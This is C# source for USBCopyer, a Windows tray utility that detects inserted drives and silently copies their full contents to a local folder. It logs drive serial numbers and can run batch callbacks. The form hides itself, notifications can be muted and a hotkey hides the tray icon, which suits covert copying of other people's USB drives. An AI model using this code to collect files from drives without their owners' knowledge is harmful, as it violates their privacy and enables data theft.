using System;
using System.Collections.Generic;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Management;
using System.Threading;
using System.Diagnostics;
using System.Linq;
using System.ComponentModel;
using System.Text;

namespace USBCopyer
{
    public partial class Host : Form
    {
        public string title   = Application.ProductName;
        public static string dir     = Application.StartupPath + @"\USBCopyerData\";
        public static string confdir = Application.StartupPath + @"\USBCopyerData\USBCopyerSystem\";
        public string[] white;
        public string[] black;
        public string[] blackdisk;
        public string[] blackid;
        public Dictionary<string,Thread> copyThread = new Dictionary<string,Thread>(); //正在复制文件的线程 分区号=>线程
        public static List<char> Volumes = new List<char>();

        public Host()
        {
            InitializeComponent();
            Hide();
            setIconX(iconStatus.free);
            if (!string.IsNullOrEmpty(Properties.Settings.Default.dir))
            {
                dir = Properties.Settings.Default.dir + "\\";
            }
            try
            {
                if (!Directory.Exists(dir))
                {
                    Directory.CreateDirectory(dir);
                }
                if (!File.Exists(dir + "Disks.csv"))
                {
                    File.WriteAllBytes(dir + "Disks.csv", Properties.Resources.Disks);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString(), title + " 初始化失败", MessageBoxButtons.OK, MessageBoxIcon.Information);
                Environment.Exit(1);
            }
            nameMenuItem.Text += " V" + Application.ProductVersion;
            if (!string.IsNullOrEmpty(Properties.Settings.Default.black))
            {
                black = Properties.Settings.Default.black.ToLower().Split(',');
            }
            else
            {
                black = new string[0];
            }
            if (!string.IsNullOrEmpty(Properties.Settings.Default.blackdisk))
            {
                blackdisk = Properties.Settings.Default.blackdisk.Split(',');
            }
            else
            {
                blackdisk = new string[0];
            }
            if (!string.IsNullOrEmpty(Properties.Settings.Default.blackid))
            {
                blackid = Properties.Settings.Default.blackid.Split(',');
            }
            else
            {
                blackid = new string[0];
            }
            if (!string.IsNullOrEmpty(Properties.Settings.Default.white))
            {
                white = Properties.Settings.Default.white.ToLower().Split(',');
            } else
            {
                white = new string[0];
            }
            nicon.Visible = Program.showicon;
            if(!Properties.Settings.Default.multirun)
            {
                Process[] processcollection = Process.GetProcessesByName(Application.ProductName);
                if (processcollection.Length >= 2)
                {
                    msg("已经有一个 USBCopyer 实例在运行中！本实例即将退出。如果您需要多重运行本程序，请在设置中打开 \"允许多重运行\" 开关", ToolTipIcon.Error);
                    Thread.Sleep(3000);
                    Environment.Exit(9);
                }
            }
            if(Properties.Settings.Default.firstrun)
            {
                msg("欢迎使用 USBCopyer V" + Application.ProductVersion + "! 右键单击此图标可进行设置");
                Properties.Settings.Default.firstrun = false;
                Properties.Settings.Default.Save();
            }
        }

        protected override void SetVisibleCore(bool value)
        {
            base.SetVisibleCore(value);
        }

        public delegate void setIconInvoke(iconStatus v);
        public void setIcon(iconStatus v)
        {
            setIconInvoke i = new setIconInvoke(setIconX);
            Invoke(i, v);
        }

        public enum iconStatus { working, free };
        public void setIconX(iconStatus v)
        {
            if (v == iconStatus.free)
            {
                nicon.Text = title + " V" + Application.ProductVersion + "\r\n状态: 空闲";
                nicon.Icon = Icon = Properties.Resources.icon_small;
                EnableToolStripMenuItem.Enabled = EnableToolStripMenuItem.Checked = true;
                EnableToolStripMenuItem.Text = "已启用 (&E)";
                KillCopyThreadStripMenuItem.Enabled = false;
            }
            else if (v == iconStatus.working)
            {
                nicon.Text = title + "\r\n状态: 正在工作，共 " + copyThread.Count + " 个存储设备";
                nicon.Icon = Icon = Properties.Resources.working_small;
                EnableToolStripMenuItem.Text = "正在工作 (&E)";
                EnableToolStripMenuItem.Enabled = false;
                KillCopyThreadStripMenuItem.Enabled = true;
            }
        }

        public void msg(string str, string t = "", ToolTipIcon msgtype = ToolTipIcon.Info)
        {
            string tit = string.IsNullOrEmpty(t) ? title : title + " - " + t;
            if (nicon.Visible && !Properties.Settings.Default.hidemsg)
            {
                nicon.ShowBalloonTip(1000, tit, str, msgtype);
            }
            Program.log(tit + "：" + str);
        }

        public void msg(string str, ToolTipIcon msgtype)
        {
            msg(str, "", msgtype);
        }

        public void error(string msg, string title = "错误")
        {
            Program.log(title + "：" + msg.Replace("\r\n", " "),2);
            if(nicon.Visible)
            {
                MessageBox.Show(msg, title, MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        public void success(string msg, string title = "操作完成")
        {
            Program.log(title + "：" + msg.Replace("\r\n", " "));
            if (nicon.Visible)
            {
                MessageBox.Show(msg, title, MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }

        private void ExitXToolStripMenuItem_Click(object sender, EventArgs e)
        {
            nicon.Dispose();
            Environment.Exit(0);
        }

        public const int WM_DEVICECHANGE = 0x219;//U盘插入后，OS的底层会自动检测到，然后向应用程序发送“硬件设备状态改变“的消息
        public const int DBT_DEVICEARRIVAL = 0x8000;  //就是用来表示U盘可用的。一个设备或媒体已被插入一块，现在可用。
        public const int DBT_DEVICEQUERYREMOVE = 0x8001;  //审批要求删除一个设备或媒体作品。任何应用程序也不能否认这一要求，并取消删除。
        public const int DBT_DEVICEQUERYREMOVEFAILED = 0x8002;  //请求删除一个设备或媒体片已被取消。
        public const int DBT_DEVICEREMOVECOMPLETE = 0x8004;  //一个设备或媒体片已被删除。
        public const int DBT_DEVICEREMOVEPENDING = 0x8003;  //一个设备或媒体一块即将被删除。不能否认的。

        protected override void DefWndProc(ref Message m)
        {
            if (m.Msg == WM_DEVICECHANGE)
            {
                int wp = m.WParam.ToInt32();
                //存储设备插/拔/弹
                if (wp == DBT_DEVICEARRIVAL || wp == DBT_DEVICEQUERYREMOVE || wp == DBT_DEVICEREMOVECOMPLETE || wp == DBT_DEVICEREMOVEPENDING) {
                    DEV_BROADCAST_HDR dbhdr = (DEV_BROADCAST_HDR)Marshal.PtrToStructure(m.LParam, typeof(DEV_BROADCAST_HDR));
                    if (dbhdr.dbch_devicetype == 2)
                    {
                        DEV_BROADCAST_VOLUME dbv = (DEV_BROADCAST_VOLUME)Marshal.PtrToStructure(m.LParam, typeof(DEV_BROADCAST_VOLUME));
                        if (dbv.dbcv_flags == 0)
                        {
                            char[] volums = GetVolumes(dbv.dbcv_unitmask);

                            int len = volums.Length;
                            int start = (int)volums[0];
                            int end = (int)volums[len - 1];
                            for (int i = start; i <= end; i++)
                            {
                                string disk =((char)i).ToString() + ":"; 
                            
                            
                            if(wp == DBT_DEVICEARRIVAL) //存储设备插入
                            {
                                try
                                {
                                    ManagementObject diskinfo = new ManagementObject("win32_logicaldisk.deviceid=\""+disk+"\"");
                                    string diskser = "";
                                    string diskname = "";
                                    string diskdir;
                                    object diskserdata  = diskinfo.Properties["VolumeSerialNumber"].Value;
                                    object disknamedata = diskinfo.Properties["VolumeName"].Value;
                                    //DiskDetectedCallback
                                    if (Properties.Settings.Default.EnableDiskDetectedCallback && File.Exists(confdir + "DiskDetectedCallback.bat"))
                                    {
                                        int ExitCode = 1;
                                        Thread th = new Thread(() => {
                                            try
                                            {
                                                string CallbackCode = File.ReadAllText(confdir + "DiskDetectedCallback.bat");
                                                string OutputPath = confdir + Path.GetRandomFileName() + ".bat";
                                                CallbackCode = ProcessCallbackCode(CallbackCode);
                                                CallbackCode = ProcessCallbackCodeWithDisk(CallbackCode, diskinfo.Properties, "NONE");
                                                File.WriteAllText(OutputPath, CallbackCode);
                                                ExitCode = RunCallback(OutputPath, out string StdOut);
                                                File.Delete(OutputPath);
                                                Program.log("DiskDetectedCallback 回调运行完成, 回调退出码: " + ExitCode + " 输出: \r\n" + StdOut);
                                            }
                                            catch (Exception ex)
                                            {
                                                Program.log("DiskDetectedCallback 回调运行失败\r\n" + ex.ToString(), 1);
                                            }
                                        });
                                        th.Start();
                                        if (Properties.Settings.Default.WaitCallback)
                                        {
                                            th.Join();
                                            if(ExitCode != 0)
                                            {
                                                Program.log("根据 DiskDetectedCallback 回调退出码: " + ExitCode + " 复制操作取消。", 0);
                                            }
                                        }
                                    }
                                    try
                                    {
                                        //Network Drive (4)
                                        if (Properties.Settings.Default.SkipNetworkDisk && (int)diskinfo.Properties["DriveType"].Value == 4)
                                        {
                                            Program.log("检测到磁盘种类为网络驱动器：" + disk + " 根据设置取消复制！");
                                            return;
                                        }
                                        //Compact Disc (5)
                                        else if (Properties.Settings.Default.SkipDVD && (int)diskinfo.Properties["DriveType"].Value == 5)
                                        {
                                            Program.log("检测到磁盘种类为光盘驱动器或虚拟光驱：" + disk + " 根据设置取消复制！");
                                            return;
                                        }
                                        //Removable Disk (2)
                                        else if (Properties.Settings.Default.SkipUDisk && (int)diskinfo.Properties["DriveType"].Value == 2)
                                        {
                                            Program.log("检测到磁盘种类为可移动磁盘：" + disk + " 根据设置取消复制！");
                                            return;
                                        }
                                        //Local Disk (3)
                                        else if (Properties.Settings.Default.SkipLocalDisk && (int)diskinfo.Properties["DriveType"].Value == 3)
                                        {
                                            Program.log("检测到磁盘种类为硬盘驱动器：" + disk + " 根据设置取消复制！");
                                            return;
                                        }
                                        //Unknown (0)
                                        //RAM Disk (6)
                                        //No Root Directory(1)
                                        else if (Properties.Settings.Default.SkipOtherDisk && ((int)diskinfo.Properties["DriveType"].Value == 6 || (int)diskinfo.Properties["DriveType"].Value == 1 || (int)diskinfo.Properties["DriveType"].Value == 0))
                                        {
                                            Program.log("检测到磁盘种类为其他驱动器：" + disk + " 根据设置取消复制！");
                                            return;
                                        }
                                    }
                                    catch (Exception) { }
                                    if(disknamedata != null)
                                    {
                                        diskname = disknamedata.ToString();
                                    }
                                    if (diskserdata == null)
                                    {
                                        if(string.IsNullOrEmpty(diskname))
                                        {
                                            diskdir = disk.Substring(0, 1);
                                        }
                                        else
                                        {
                                            diskdir = disk.Substring(0, 1) + " - " + diskname;
                                        }
                                        msg(disk, "存储设备已插入");
                                        Program.log("获取存储设备序列号失败，文件目录将命名为：" + diskdir);
                                    }
                                    else
                                    {
                                        diskser = diskserdata.ToString();
                                        diskdir = diskser;
                                        msg(disk + " - " + diskser, "存储设备已插入");
                                    }
                                    if (EnableToolStripMenuItem.Checked)
                                    {
                                        //使用黑名单磁盘模式
                                        if(Properties.Settings.Default.UseBlackDisk)
                                        {
                                            if (!string.IsNullOrEmpty(diskser) && blackid.Contains(diskser))
                                            {
                                                Program.log("黑名单磁盘序列号：" + diskser + " 取消复制！");
                                                return;
                                            }
                                            if (!string.IsNullOrEmpty(disk) && blackdisk.Contains(disk.Substring(0, 1)))
                                            {
                                                Program.log("黑名单分区号：" + disk + " 取消复制！");
                                                return;
                                            }
                                        }
                                        else //使用白名单磁盘模式
                                        {
                                            if ((string.IsNullOrEmpty(diskser) || !blackid.Contains(diskser)) && (string.IsNullOrEmpty(disk) || !blackdisk.Contains(disk.Substring(0, 1))))
                                            {
                                                Program.log("磁盘序列号：" + diskser + " 及分区号 " + disk + " 均不在白名单，取消复制！");
                                                return;
                                            }
                                        }
                                        copyThread[disk] = new Thread(() =>
                                        {
                                            if (Properties.Settings.Default.sleep > 0)
                                            {
                                                Program.log("延迟复制：将在 " + Properties.Settings.Default.sleep + "秒后进行复制");
                                                Thread.Sleep(Properties.Settings.Default.sleep * 1000);
                                                if (!Directory.Exists(disk + "\\"))
                                                {
                                                    if(string.IsNullOrEmpty(diskser))
                                                    {
                                                        Program.log("在延迟复制期间获取序列号失败的存储设备已拔出，复制取消：" + diskdir, 1);
                                                    }
                                                    else
                                                    {
                                                        Program.log("在延迟复制期间存储设备已拔出，复制取消：" + disk + " - " + diskser, 1);
                                                    }
                                                    return;
                                                }
                                            }
                                            setIcon(iconStatus.working);
                                            if (Properties.Settings.Default.autorm && Directory.Exists(dir + diskdir))
                                            {
                                                Program.log("清空输出目录：" + dir + diskdir);
                                                Directory.Delete(dir + diskdir, true);
                                            }
                                            if (!File.Exists(dir + "Disks.csv"))
                                            {
                                                File.WriteAllBytes(dir + "Disks.csv", Properties.Resources.Disks);
                                            }
                                            try
                                            {
                                                FileStream fs = File.Open(dir + "Disks.csv", FileMode.Append, FileAccess.Write);
                                                string DiskLog = "\r\n"
                                                  + "\"" + DateTime.Now.ToLocalTime().ToString() + "\","
                                                  + "\"" + diskser + "\","
                                                  + "\"" + diskname + "\","
                                                  + "\"" + disk + "\","
                                                  + "\"" + diskinfo.Properties["FileSystem"].Value + "\","
                                                  + "\"" + diskinfo.Properties["Description"].Value + "\","
                                                  + "\"" + diskdir + "\",";
                                                var DiskLogBytes = Encoding.Default.GetBytes(DiskLog);
                                                fs.Position = fs.Length;
                                                fs.Write(DiskLogBytes, 0, DiskLogBytes.Length);
                                                fs.Close();
                                            }
                                            catch(Exception ex)
                                            {
                                                Program.log("写入磁盘日志 Disk.csv 失败，文件可能被占用：\r\n" + ex.ToString(), 1);
                                            }
                                            CopyDirectory(disk + "\\", dir + diskdir); 
                                            if (Properties.Settings.Default.SkipEmptyFolder)
                                            {
                                                KillEmptyDirectory(dir + diskdir);
                                            }
                                            //AllCompletedCallback
                                            if (Properties.Settings.Default.EnableAllCompletedCallback && File.Exists(confdir + "AllCompletedCallback.bat"))
                                            {
                                                Thread th = new Thread(() =>
                                                {
                                                    try
                                                    {
                                                        string CallbackCode = File.ReadAllText(confdir + "AllCompletedCallback.bat");
                                                        string OutputPath = confdir + Path.GetRandomFileName() + ".bat";
                                                        CallbackCode = ProcessCallbackCode(CallbackCode);
                                                        CallbackCode = ProcessCallbackCodeWithDisk(CallbackCode, diskinfo.Properties, diskdir);
                                                        File.WriteAllText(OutputPath, CallbackCode);
                                                        int ExitCode = RunCallback(OutputPath, out string StdOut);
                                                        File.Delete(OutputPath);
                                                        Program.log("AllCompletedCallback 回调运行完成, 回调退出码: " + ExitCode + " 输出: \r\n" + StdOut);
                                                    }
                                                    catch(Exception ex)
                                                    {
                                                        Program.log("AllCompletedCallback 回调运行失败\r\n" + ex.ToString(), 1);
                                                    }
                                                });
                                                th.Start();
                                            }
                                            //free
                                            setIcon(iconStatus.free);
                                            if (string.IsNullOrEmpty(diskser))
                                            {
                                                Program.log("设备数据复制完成，但由于获取磁盘序列号失败，文件目录命名为：" + diskdir);
                                            }
                                            else
                                            {
                                                Program.log("设备数据复制完成：" + disk + " - " + diskser);
                                            }
                                            copyThread.Remove(disk);
                                        });
                                        copyThread[disk].IsBackground = true;
                                        copyThread[disk].Start();
                                    }
                                }
                                catch(Exception ex)
                                {
                                    setIcon(iconStatus.free);
                                    Program.log("获取插入的存储设备信息失败，复制已取消：" + ex.ToString(),2);
                                }
                            }
                            else  //存储设备拔/弹出
                            {
                                try
                                {
                                    setIcon(iconStatus.free);
                                    if (copyThread.ContainsKey(disk))
                                    {
                                        if (copyThread[disk].IsAlive)
                                        {
                                            copyThread[disk].Abort();
                                            copyThread[disk] = null;
                                        }
                                        copyThread.Remove(disk);
                                        Program.log("用户弹出了存储设备，强制停止复制：" + disk,1);
                                    }
                                }
                                catch (Exception) {}
                                }
                            } 
                        }
                    }
                }
            }
            base.DefWndProc(ref m);
        }

        private string ProcessCallbackCode(string callbackCode)
        {
            return callbackCode
                .Replace("{$SystemDir}", Application.StartupPath)
                .Replace("{$SystemVer}", Application.ProductVersion)
                .Replace("{$DataDir}", dir);
        }

        private string ProcessCallbackCodeWithDisk(string callbackCode, PropertyDataCollection data,string outputdir)
        {
            return callbackCode
                .Replace("{$VolumeSerialNumber}", data["VolumeSerialNumber"].Value.ToString())
                .Replace("{$VolumeName}", data["VolumeName"].Value.ToString())
                .Replace("{$Volume}", data["Name"].Value.ToString())
                .Replace("{$DriveType}", data["DriveType"].Value.ToString())
                .Replace("{$USBDir}", outputdir);
        }

        private static int RunCallback(String cmd, out string StdOut)
        {
            var p = new Process();
            var si = new ProcessStartInfo();
            si.FileName = cmd;
            si.UseShellExecute = false;
            si.CreateNoWindow = true;
            si.RedirectStandardOutput = true;
            si.RedirectStandardError = true;
            si.WorkingDirectory = confdir;
            p.StartInfo = si;

            p.Start();
            p.WaitForExit();
            StdOut = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
            return p.ExitCode;
        }

        /// <summary>
        /// 根据驱动器掩码返回驱动器号数组
        /// </summary>
        /// <param name="Mask">掩码</param>
        /// <returns>返回驱动器号数组</returns>
        public static char[] GetVolumes(UInt32 Mask)
        {
           // List<char> Volumes = new List<char>();

            for (int i = 0; i <= 26; i++)
            {
                //uint p = (uint)Math.Pow(2, i);
                uint p = (uint)Math.Floor(Math.Log(Mask, 2));
               // if ((p | Mask) == p)
                if (i == p)
                {
                    Volumes.Add((char)('A' + i));
                }
            }

            return Volumes.ToArray();
        }

        private void EnableToolStripMenuItem_Click(object sender, EventArgs e)
        {
            EnableToolStripMenuItem.Checked = !EnableToolStripMenuItem.Checked;
            EnableToolStripMenuItem.Text = EnableToolStripMenuItem.Checked ? "已启用 (&E)" : "未启用 (&E)";
        }

        [StructLayout(LayoutKind.Sequential)]
        struct DEV_BROADCAST_HDR
        {
            public UInt32 dbch_size;
            public UInt32 dbch_devicetype;
            public UInt32 dbch_reserved;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct DEV_BROADCAST_VOLUME
        {
            public UInt32 dbcv_size;
            public UInt32 dbcv_devicetype;
            public UInt32 dbcv_reserved;
            public UInt32 dbcv_unitmask;
            public UInt16 dbcv_flags;
        }

        /// <summary>
        /// 复制文件夹（及文件夹下所有子文件夹和文件）
        /// </summary>
        /// <param name="sourcePath">待复制的文件夹路径</param>
        /// <param name="destinationPath">目标路径</param>
        private void CopyDirectory(string sourcePath, string destinationPath)
        {
            try
            {
                DirectoryInfo info = new DirectoryInfo(sourcePath);
                if(!Directory.Exists(destinationPath))
                {
                    Directory.CreateDirectory(destinationPath);
                }
                int fileSizeLimit = Properties.Settings.Default.filesize * 1048576;
                string CopyLog = "复制操作：输出目录：" + destinationPath + "\r\n";
                foreach (FileSystemInfo fsi in info.GetFileSystemInfos())
                {
                    String destName = Path.Combine(destinationPath, fsi.Name);

                    if (fsi is FileInfo)
                    {   //如果是文件，复制文件
                        try
                        {
                            FileInfo fi1 = new FileInfo(fsi.FullName);
                            if(checkExt(fi1.Extension))
                            {
                                CopyLog += "复制文件：" + fsi.FullName + "\r\n";
                                if (File.Exists(destName))
                                {
                                    switch (Properties.Settings.Default.conflict)
                                    {
                                        case 0:
                                            FileInfo fi2 = new FileInfo(destName);
                                            if (fi1.LastWriteTime > fi2.LastWriteTime)
                                            {
                                                File.Copy(fsi.FullName, destName, true);
                                            }
                                            break;
                                        case 1:
                                            destName = (new Random()).Next(0, 9999999) + "-" + destName;
                                            File.Copy(fsi.FullName, destName);
                                            break;
                                        case 2:
                                            File.Copy(fsi.FullName, destName, true);
                                            break;
                                        default:
                                            break;
                                    }
                                }
                                else
                                {
                                    switch (Properties.Settings.Default.filesizetype)
                                    {
                                        case 0:
                                            File.Copy(fsi.FullName, destName);
                                            break;
                                        case 1:
                                            if(fi1.Length > fileSizeLimit)
                                            {
                                                File.Copy(fsi.FullName, destName);
                                            }
                                            break;
                                        case 2:
                                            if(fi1.Length < fileSizeLimit)
                                            {
                                                File.Copy(fsi.FullName, destName);
                                            }
                                            break;
                                    }
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            CopyLog +=  "复制文件失败：" + destName + "\r\n" + ex.ToString();
                        }
                    }
                    else //如果是文件夹，新建文件夹，递归
                    {
                        try
                        {
                            if(Properties.Settings.Default.SkipEmptyFolder)
                            {
                                FileSystemInfo[] subFiles = (new DirectoryInfo(fsi.FullName)).GetFileSystemInfos();
                                if (subFiles.Count() > 0)
                                {
                                    CopyDirectory(fsi.FullName, destName);
                                }
                            }
                            else
                            {
                                CopyDirectory(fsi.FullName, destName);
                            }
                        }
                        catch (Exception ex)
                        {
                            Program.log("创建目录：" + destName + "：失败：" + ex.ToString(), 1);
                        }
                    }
                }
                Program.log(CopyLog, 0);
            }
            catch (Exception ex)
            {
                Program.log("复制目录失败，设备可能被强行拔出：" + ex.ToString(), 1);
            }
        }

        private bool checkExt(string ext)
        {
            if (string.IsNullOrEmpty(ext) && Properties.Settings.Default.copynoext) return true;
            string extn = ext.ToLower().Substring(1);
            switch(Properties.Settings.Default.mode)
            {
                case 1: //黑
                    if(black.Contains(extn))
                    {
                        return false;
                    }
                    return true;
                case 2: //白
                    if (white.Contains(extn))
                    {
                        return true;
                    }
                    return false;
                default:
                    return true;
            }
        }

        private void HideHToolStripMenuItem_Click(object sender, EventArgs e)
        {
            nicon.Visible = nicon.Visible ? false : true;
        }

        private void LogToolStripMenuItem_Click(object sender, EventArgs e)
        {
            openLogFile();
        }

        public void openLogFile()
        {
            if(!File.Exists(confdir + "EventViewer.xml"))
            {
                File.WriteAllText(confdir + "EventViewer.xml", Properties.Resources.EventViewer);
            }
            try
            {
                Process.Start("eventvwr.exe", "/v:\""+confdir + "EventViewer.xml"+"\"");
            }
           catch (Exception ex)
            {
                error("打开日志查看器失败：" + ex.ToString());
            }
        }

        private void SettingToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Thread th = new Thread(() =>
            {
                Setting dia = new Setting();
                dia.host = this;
                Application.Run(dia);
            });
            th.SetApartmentState(ApartmentState.STA);
            th.Start();
        }

        private void FileStripMenuItem_Click(object sender, EventArgs e)
        {
            openFile();
        }

        public void openFile()
        {
            try
            {
                if(!Directory.Exists(dir))
                {
                    Directory.CreateDirectory(dir);
                }
                Process.Start("explorer.exe", "\"" + dir + "\"");
            }
            catch (Exception ex)
            {
                error("打开失败：" + ex.ToString());
            }
        }

        /// <summary>
        /// 删除掉空文件夹
        /// 所有没有子“文件系统”的都将被删除
        /// </summary>
        /// <param name="storagepath"></param>
        public void KillEmptyDirectory(String startLocation)
        {
            foreach (var directory in Directory.GetDirectories(startLocation))
            { 
                KillEmptyDirectory(directory);
                if (Directory.GetFiles(directory).Length == 0 &&
                Directory.GetDirectories(directory).Length == 0)
                {
                    Directory.Delete(directory, false);
                }
            }
        }

        public void openBlog()
        {
            try
            {
                Process.Start("explorer.exe", "\"https://kenvix.com/\"");
            }
            catch (Exception ex)
            {
                error("打开失败：" + ex.ToString());
            }
        }

        private void BlogMenuItem_Click(object sender, EventArgs e)
        {
            openBlog();
        }

        private void nameMenuItem_Click(object sender, EventArgs e)
        {
            openPage();
        }

        public void openPage()
        {
            try
            {
                Process.Start("explorer.exe", "\"https://kenvix.com/post/usbcopyer/\"");
            }
            catch (Exception ex)
            {
                error("打开失败：" + ex.ToString());
            }
        }

        private void nicon_MouseDoubleClick(object sender, MouseEventArgs e)
        {

        }

        private void clearLog_Click(object sender, EventArgs e)
        {
            if (Program.logger != null) {
                Program.logger.Clear();
            }
        }

        private void diskUUIDList_Click(object sender, EventArgs e)
        {
            (new diskUUID()).Show();
        }

        private void KillCopyThreadStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach(KeyValuePair<string,Thread>th in copyThread)
            {
                if(th.Value.IsAlive)
                {
                    th.Value.Abort();
                }
            }
            setIcon(iconStatus.free);
        }

        private void DiskLogStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                Process.Start("explorer.exe", "\"" + dir + "Disks.csv" + "\"");
            }
            catch (Exception ex)
            {
                error("打开失败：" + ex.ToString());
            }
        }

        private void restartUSBCopyerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                Process.Start("cmd.exe", "/c title Restarting USBCopyer && echo Killing USBCopyer && taskkill /f /pid "+Process.GetCurrentProcess().Id + " && echo Starting USBCopyer && start \"\" \""+Application.ExecutablePath+"\"");
            }
            catch (Exception ex)
            {
                msg("快速重启失败:\r\n" + ex.Message, ToolTipIcon.Error);
            }
        }

        private void Host_Load(object sender, EventArgs e)
        {
            Hide();
            Hotkey hotkey;//定义快键键(热键)
            hotkey = new Hotkey(this.Handle);
            Hotkey.Hotkey1 = hotkey.RegisterHotkey(Keys.H, Hotkey.KeyFlags.Control | Hotkey.KeyFlags.Alt);   //定义快键键
            hotkey.OnHotkey += new HotkeyEventHandler(OnHotkey);//定义快键键
            SetVisibleCore(false);
        }

        public void OnHotkey(int HotkeyID) //Ctrl+alt+h 隐藏状态栏图标，再按显示图标。
        {
            if (HotkeyID == Hotkey.Hotkey1)
            {
                if (nicon.Visible == true)
                    nicon.Visible = false;
                else
                    nicon.Visible = true;
            }
            else
            {
                nicon.Visible = false;
            }
        }
    }
}
